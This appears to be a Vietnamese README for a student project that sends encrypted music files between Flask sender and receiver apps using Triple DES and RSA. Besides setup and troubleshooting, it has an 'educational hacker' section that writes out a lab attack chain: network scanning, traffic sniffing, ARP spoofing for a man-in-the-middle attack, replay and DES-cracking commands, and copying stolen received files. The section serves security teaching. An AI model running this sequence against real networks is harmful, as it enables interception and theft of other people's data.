# Hướng Dẫn Sử Dụng Hệ Thống Truyền Nhạc Bảo Mật

## 📋 Mục Lục
1. [Giới Thiệu](#giới-thiệu)
2. [Cấu Trúc Hệ Thống](#cấu-trúc-hệ-thống)
3. [Hướng Dẫn Cho Người Gửi (Sender)](#hướng-dẫn-cho-người-gửi-sender)
4. [Hướng Dẫn Cho Người Nhận (Receiver)](#hướng-dẫn-cho-người-nhận-receiver)
5. [Hướng Dẫn Cho Hacker (Educational)](#hướng-dẫn-cho-hacker-educational)
6. [Xử Lý Sự Cố](#xử-lý-sự-cố)

---

## Giới Thiệu

Hệ thống truyền nhạc bảo mật cho phép gửi file nhạc có bản quyền một cách an toàn giữa Sender và Receiver thông qua mã hóa Triple DES và RSA.

### Các thành phần:
- **Sender** (Port 5001): Máy gửi file nhạc
- **Receiver** (Port 5000): Máy nhận và giải mã file nhạc

### Các bước thực hiện:
1. Handshake - Thiết lập kết nối
2. Key Exchange - Trao đổi khóa phiên
3. File Transfer - Mã hóa và gửi file

---

## Cấu Trúc Hệ Thống

```
c:\ATBM\
  ├── SECURITY_SCENARIOS.md    # Tình huống tấn công
  ├── HACKER_SCENARIO.md       # Kịch bản hacker
  ├── ADMIN_FIX_GUIDE.md       # Hướng dẫn khắc phục
  ├── README.md                # File này
  └── music_security\
      ├── crypto_utils.py      # Module mã hóa
      ├── sender_app.py        # Ứng dụng Sender
      ├── receiver_app.py      # Ứng dụng Receiver
      ├── receiver_app_logic.py # Logic xử lý
      ├── requirements.txt     # Dependencies
      ├── uploads/             # Thư mục tạm (Sender)
      └── received/            # Thư mục file nhận (Receiver)
```

---

## Hướng Dẫn Cho Người Gửi (Sender)

### Mục tiêu: Gửi file nhạc có bản quyền đến Receiver một cách an toàn

### Bước 1: Khởi động Sender

```bash
# Di chuyển vào thư mục chứa code
cd c:\ATBM\music_security\music_security

# Chạy Sender
python sender_app.py
```

**Kết quả mong đợi**:
```
 * Running on http://0.0.0.0:5001
```

### Bước 2: Mở giao diện web

1. Mở trình duyệt
2. Truy cập: `http://localhost:5001`
3. Giao diện màu tím sẽ hiện ra

### Bước 3: Kết nối với Receiver

#### Cách 1: Tự động phát hiện (Khuyến nghị)
- Hệ thống sẽ tự động tìm Receiver trong mạng LAN
- Đợi thông báo "Found! Đã tự động nhận diện Receiver"

#### Cách 2: Nhập thủ công
1. Nhập địa chỉ Receiver vào ô "Receiver URL"
   - Ví dụ: `http://192.168.1.100:5000`
2. Click nút **"Conn"** để kết nối

#### Cách 3: Quét mạng LAN
1. Click nút **"🔍 Scan"**
2. Chọn Receiver từ dropdown list

### Bước 4: Thực hiện Handshake

1. Click nút **"1. Handshake"**
2. Đợi kết quả:
   - ✅ **Thành công**: "Handshake thành công"
   - ❌ **Thất bại**: Kiểm tra lại địa chỉ Receiver

### Bước 5: Thực hiện Key Exchange

1. Click nút **"2. Key Exchange"**
2. Hệ thống tự động:
   - Tạo RSA keypair cho Sender
   - Lấy Public Key từ Receiver
   - Tạo Session Key (24 bytes)
   - Ký metadata bằng RSA/SHA-512
   - Mã hóa Session Key bằng RSA-OAEP
   - Gửi cho Receiver

3. Đợi kết quả:
   - ✅ **Thành công**: "Key Exchange thành công"
   - Nút "MÃ HÓA & GỬI FILE" được kích hoạt

### Bước 6: Gửi File Nhạc

1. **Điền thông tin**:
   - **Tên nghệ sĩ**: Ví dụ "Sơn Tùng M-TP"
   - **Thông tin bản quyền**: Ví dụ "Bản quyền thuộc về M-TP Entertainment"

2. **Chọn file nhạc**:
   - Click ô "Chọn File nhạc"
   - Chọn file MP3, FLAC, WAV (tối đa 100MB)

3. **Gửi file**:
   - Click nút **"MÃ HÓA TRIPLE DES & PHÁT ĐI (SEND)"**
   - Đợi quá trình mã hóa và gửi

4. **Theo dõi tiến trình**:
   - Mã hóa metadata: ~10-50ms
   - Mã hóa file Triple DES: ~100-500ms
   - Tính hash SHA-512: ~50-200ms
   - Ký số: ~50-150ms
   - Gửi qua mạng: ~100-1000ms

5. **Kết quả**:
   - ✅ **ACK**: File gửi thành công
   - Hiển thị thông tin: thời gian, kích thước

### Bước 7: Reset (nếu cần)

- Click **"Reset System"** ở sidebar để bắt đầu phiên mới

---

## Hướng Dẫn Cho Người Nhận (Receiver)

### Mục tiêu: Nhận và giải mã file nhạc từ Sender

### Bước 1: Khởi động Receiver

```bash
# Di chuyển vào thư mục chứa code
cd c:\ATBM\music_security\music_security

# Chạy Receiver
python receiver_app.py
```

**Kết quả mong đợi**:
```
🚀 Receiver Server khởi động tại http://0.0.0.0:5000
[BROADCAST] Đang tự động phát tín hiệu nhận diện IP ra mạng LAN...
 * Running on http://0.0.0.0:5000
```

### Bước 2: Mở giao diện web

1. Mở trình duyệt
2. Truy cập: `http://localhost:5000`
3. Giao diện màu xanh cyan sẽ hiện ra

### Bước 3: Chờ kết nối từ Sender

- Receiver sẽ tự động:
  - Nhận Handshake từ Sender
  - Thực hiện Key Exchange
  - Nhận file nhạc

- **Không cần thao tác gì** - mọi thứ tự động!

### Bước 4: Xem file đã nhận

1. **Danh sách file** hiển thị ở mục "File Đã Nhận"
2. **Thông tin hiển thị**:
   - Tên file
   - Kích thước
   - Nghệ sĩ
   - Bản quyền
   - Hash SHA-256
   - Thời gian nhận

### Bước 5: Nghe nhạc

1. Click nút **"Nghe"** trên file đã nhận
2. File sẽ phát trực tiếp trong trình duyệt
3. Player bar ở dưới cùng hiển thị:
   - Tên file
   - Thời gian phát
   - Progress bar

### Bước 6: Tải file về máy

1. Click nút **"⬇ Tải"** trên file đã nhận
2. File đã giải mã sẽ được tải về
3. Lưu trong thư mục: `music_security/received/`

### Bước 7: Theo dõi Logs

- **Crypto Logs** ở sidebar bên phải hiển thị:
  - Thời gian các bước
  - Trạng thái handshake/key exchange
  - Lỗi nếu có

### Bước 8: Reset (nếu cần)

- Click **"Reset System"** ở sidebar
- Hoặc refresh trang

---

## Hướng Dẫn Cho Hacker (Educational)

### ⚠️ CẢNH BÁO: Chỉ sử dụng cho mục đích học tập!

**Tài liệu này chỉ mang tính chất giáo dục!**
- ❌ Không tấn công hệ thống của người khác
- ❌ Không sử dụng cho mục đích xấu
- ✅ Chỉ test trên hệ thống của bạn
- ✅ Học tập để phòng chống tấn công

### Mục tiêu: Tìm hiểu cách hacker tấn công hệ thống

### Công cụ cần chuẩn bị

```bash
# Kali Linux / Parrot OS
sudo apt update
sudo apt install -y nmap wireshark tcpdump arpspoof hydra john hashcat

# Hoặc trên Windows
# Tải Wireshark: https://www.wireshark.org/
# Tải Nmap: https://nmap.org/
```

### Phase 1: Reconnaissance - Thu thập thông tin

#### Bước 1.1: Quét mạng LAN

```bash
# Tìm IP của Sender và Receiver
nmap -sn 192.168.1.0/24

# Kết quả:
# 192.168.1.100 - Sender
# 192.168.1.101 - Receiver
```

#### Bước 1.2: Quét port

```bash
# Quét port 5000 và 5001
nmap -sV 192.168.1.101 -p 5000,5001

# Kết quả:
# 5000/tcp open http Flask HTTP Server
# 5001/tcp open http Flask HTTP Server
```

#### Bước 1.3: Khám phá API

```bash
# Thử các endpoint
curl http://192.168.1.101:5000/api/status
curl http://192.168.1.101:5000/api/handshake
curl http://192.168.1.101:5000/api/get_public_key
```

### Phase 2: Passive Attack - Bắt gói tin

#### Bước 2.1: Sniffing traffic

```bash
# Sử dụng Wireshark (GUI)
# Hoặc tcpdump (CLI)
sudo tcpdump -i eth0 host 192.168.1.100 -w music_traffic.pcap

# Phân tích gói tin
# Mở file .pcap trong Wireshark
# Tìm các request: handshake, key exchange, file transfer
```

#### Bước 2.2: Trích xuất thông tin

```bash
# Từ gói tin đã bắt được:
# - Public Key của Receiver
# - Encrypted Session Key
# - Metadata (filename, timestamp)
# - Signature
```

### Phase 3: Active Attack - Tấn công chủ động

#### Bước 3.1: MITM Attack

```bash
# Kích hoạt IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing
arpspoof -i eth0 -t 192.168.1.100 192.168.1.101
arpspoof -i eth0 -t 192.168.1.101 192.168.1.100

# Tạo fake receiver (xem HACKER_SCENARIO.md)
python fake_receiver.py
```

#### Bước 3.2: Replay Attack

```bash
# Lưu gói tin hợp lệ
# packet.json chứa: {iv, cipher, meta, hash, sig}

# Phát lại
python replay_attack.py

# Kết quả: File được nhận lại!
```

#### Bước 3.3: Crack DES (nếu có session key)

```bash
# Sử dụng John The Ripper
john --format=des hash.txt

# Hoặc Hashcat
hashcat -m 14000 -a 0 hash.txt wordlist.txt
```

### Phase 4: Post-Exploitation

```bash
# Đánh cắp file đã nhận
# Từ Receiver
ls music_security/received/
cp music_security/received/*.mp3 /hacker/downloads/

# Hoặc qua API
python steal_files.py
```

### 📚 Tài liệu tham khảo

- **Wireshark Tutorial**: https://www.wireshark.org/docs/wsug_html_chunked/
- **Nmap Guide**: https://nmap.org/book/
- **MITM Attack**: https://en.wikipedia.org/wiki/Man-in-the-middle_attack
- **Replay Attack**: https://en.wikipedia.org/wiki/Replay_attack

---

## Xử Lý Sự Cố

### ❌ Lỗi: ModuleNotFoundError: No module named 'crypto_utils'

**Nguyên nhân**: Đang ở sai thư mục

**Giải pháp**:
```bash
# Di chuyển vào đúng thư mục
cd c:\ATBM\music_security\music_security

# Sau đó chạy lại
python sender_app.py
python receiver_app.py
```

### ❌ Lỗi: No module named 'Crypto'

**Giải pháp**:
```bash
pip install pycryptodome
```

### ❌ Lỗi: No module named 'flask'

**Giải pháp**:
```bash
pip install flask
```

### ❌ Lỗi: Address already in use

**Nguyên nhân**: Port 5000 hoặc 5001 đang bị chiếm

**Giải pháp Windows**:
```bash
# Tìm process
netstat -ano | findstr :5000

# Kill process (thay <PID>)
taskkill /PID <PID> /F
```

### ❌ Handshake thất bại

**Kiểm tra**:
1. Receiver đã chạy chưa? `http://localhost:5000`
2. Địa chỉ IP đúng chưa?
3. Firewall có chặn không?

### ❌ Key exchange lỗi

**Giải pháp**:
1. Thực hiện lại Handshake
2. Kiểm tra logs ở cả 2 bên
3. Restart cả 2 ứng dụng

---

## 📞 Liên Hệ

**Nếu gặp vấn đề**:
1. Kiểm tra lại các bước cài đặt
2. Đọc kỹ thông báo lỗi
3. Kiểm tra logs trong giao diện web
4. Thử restart cả 2 ứng dụng

---

## 📚 Tài Liệu Tham Khảo

- **Flask**: https://flask.palletsprojects.com/
- **PyCryptodome**: https://pycryptodome.readthedocs.io/
- **Triple DES**: https://en.wikipedia.org/wiki/Triple_DES
- **RSA**: https://en.wikipedia.org/wiki/RSA_(cryptosystem)

---

**Chúc bạn sử dụng thành công!** 🎵🔒